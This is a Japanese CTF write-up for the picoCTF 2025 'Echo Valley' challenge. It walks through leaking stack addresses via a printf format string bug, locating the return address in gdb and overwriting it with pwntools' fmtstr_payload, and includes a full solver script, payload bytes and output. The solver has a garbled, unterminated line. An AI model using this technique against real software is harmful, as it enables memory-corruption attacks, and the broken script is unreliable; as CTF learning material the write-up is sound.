# picoCTF2025　Echo Valley

全問のPIE TIME系列を進化させたような問題

printfの脆弱性Format String Bugで解く（%pでポインタを表示させて現在のアドレスを知り、そこから逆算してそのprintfとmainの距離を調べる）

攻撃方法として、echo_valleyのリターンアドレスを書き換えることでprint_flag関数へ飛ばし、フラグを手に入れるという方法をとる。

まずは、入力がスタックの何番目からはじまるのかを調べる
```
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p
```
このように送り、AAAAの16進数である0x41414141の場所を調べる
このとき、このプログラムはリトルエンディアンで動いているため、0x2e70252e41414141として帰ってくる
```
Welcome to the Echo Valley, Try Shouting: 
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
You heard in the distance: AAAA.0x7fffffffda70.(nil).(nil).0x5555555596d9.0x410.0x2e70252e41414141.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0xa.(nil)
```

次に、echo_valleyのリターンアドレスがほしい

echo_valleyにブレークポイントを置き、一度動かす。
```
(gdb) b echo_valley
Breakpoint 2 at 0x555555555313: file /home/valley/valley.c, line 20.

(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /mnt/c/Users/tonoe/OneDrive/ドキュメント/ctf/picoCTF2025/Echo_Valley/valley 
Downloading separate debug info for system-supplied DSO at 0x7ffff7fc3000
[Thread debugging using libthread_db enabled]                                                                    
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 2, echo_valley () at /home/valley/valley.c:20
20      void echo_valley() {
```

ここで、mainのアセンブリ命令の位置とスタックの中身を調べる

```
(gdb) disas main
Dump of assembler code for function main:
   0x0000555555555401 <+0>:     endbr64
   0x0000555555555405 <+4>:     push   %rbp
   0x0000555555555406 <+5>:     mov    %rsp,%rbp
   0x0000555555555409 <+8>:     mov    $0x0,%eax
   0x000055555555540e <+13>:    call   0x555555555307 <echo_valley>
   0x0000555555555413 <+18>:    mov    $0x0,%eax
   0x0000555555555418 <+23>:    pop    %rbp
   0x0000555555555419 <+24>:    ret
End of assembler dump.

(gdb) x/20gx $rsp
0x7fffffffdc20: 0x0000000001000000      0x0000000000080000
0x7fffffffdc30: 0x0000000000008000      0x00007fffffffdc68
0x7fffffffdc40: 0x0000004400000019      0x0000000000000000
0x7fffffffdc50: 0x0000000000000000      0x0000000000000000
0x7fffffffdc60: 0x0000000000000000      0x0000000000000000
0x7fffffffdc70: 0x0000000000000000      0x0000000000000000
0x7fffffffdc80: 0x0000000000000000      0x00007ffff7fe5af0
0x7fffffffdc90: 0x00007fffffffdca0      0x0000555555555413
0x7fffffffdca0: 0x00007fffffffdd40      0x00007ffff7dcf1ca
0x7fffffffdcb0: 0x00007fffffffdcf0      0x00007fffffffddc8
```

```
0x000055555555540e <+13>:    call   0x555555555307 <echo_valley>
```
は関数の呼び出しであり、
```
0x0000555555555413 <+18>:    mov    $0x0,%eax
```
が関数echo_valleyのリターンアドレスである。リターンアドレス0x0000555555555413はスタックの16番目に存在することがわかる。

printfの仕様として、（この環境では）printfの引数は6個までレジスタから取られ、残りはスタックから取られるから14+6-1（1は重複分）である21番目にmain関数があることがわかる
main関数とprint_flag関数のアドレスの差を利用することで、この情報を使用することでwin関数の位置がわかる。

また、書き換えたい場所である現在のリターンアドレスがある場所である0x0000555555555413は0x7fffffffdc90+8の場所である。
これの位置もrで実際に実行して調べてみる(実行結果は忘れていました。)
```
.%15$p.%16$p.%17$p.%18$p.%19$p.%20$p.%21$p.%22$p
```
これの結果、20番目にあることがわかる。また、21番目にmain関数があることも確認できる。

main関数の位置、print_flag関数の位置を調べる
(実行結果はないですすみません)
```
p main
p print_flag
```
これにより、差分は0x1aa分であることがわかる。

手動で行うのは厳しいので、solverを使用する。
pwntoolsというツールを使用して作る。

```python
from pwn import *
#nc接続のための設定
context(arch='amd64', os='linux')
#p = process("./valley")
p = remote("shape-facility.picoctf.net", 65065)#←問題文によって変更する

# スタック上の位置を指すアドレスを取得する
p.recvuntil(b"Try Shouting: \n")
p.sendline(b"%20$p")#20番目を取る
p.recvuntil(b"the distance: ")
old_esp: int = int(p.recvline().strip(), 16)
addr_retaddr: int = old_esp - 0x8#リターンアドレスのある場所を特定している。そのための+8

# 書き換え後の値（print_flag関数のアドレス）を取得する
p.sendline(b"%21$p")#21番目を取る
p.recvuntil(b"the distance: ")
retaddr: int = int(p.recvline().strip(), 16)
win_addr: int = retaddr - 0x1aa#winとmainの距離分を引いている。これでwinのアドレスを得る。

# 書式文字列攻撃：pwntoolの機能を使う
writes_dict = {addr_retaddr: win_addr}
# payload.len < 100になるよう気をつける（入力bufのサイズ制限のため）
payload = fmtstr_payload(6, writes_dict, write_size="short")
print(payload)
p.sendline(payload)
# ここでrecvしたら動かず困った 何故かは不明

p.sendline(b"exかけてい
p.interactive()
```
payloadについての簡易的な説明
```python
payload = fmtstr_payload(6, writes_dict, write_size="short")
```
pwntoolsの強力な機能

6: あなたの入力がスタックの6番目から始まる、というオフセット。（最初のAAAA.%p・・・で特定した。）

writes_dict: 「addr_retaddrという場所に、win_addrという値を書き込んでね」という指示書

write_size="short": ペイロードを短くするためのテクニックで、2バイトずつ書き込む %hn を使う設定

実行結果は次の通りである。
```
$ uv run solver.py
[+] Opening connection to shape-facility.picoctf.net on port 65065: Done
b'%8809c%11$lln%14054c%12$hn%39419c%13$hna\xe8\xf3\x10\x17\xff\x7f\x00\x00\xec\xf3\x10\x17\xff\x7f\x00\x00\xea\xf3\x10\x17\xff\x7f\x00\x00'
[*] Switching to interactive mode
You heard in the distance:
(省略)
\x00a\xe8\xf3\x10\x17\xff\x7fThe Valley Disappears
Congrats! Here is your flag: picoctf{(省略)}
[*] Got EOF while reading in interactive
```

どうやらすでにあるものを使いまわしている人が多いっぽい
これを使いまわせば同じような問題は解けそう。

リターンアドレス格納しているメモリの位置が20番目になる理由とかはわからん。21番目の前に入れるものなのかな

参考

geminiに聞いたやつ　一番理解できた気がする
https://g.co/gemini/share/f68c547147c4
その他ブログ
https://zenn.dev/tetsurou/articles/6fe4d41a3f6f48#echo-valley---300pt
↓solve.pyはここからとってきた
https://everykalax.hateblo.jp/entry/2025/03/18/084018#Echo-Valley-binary-300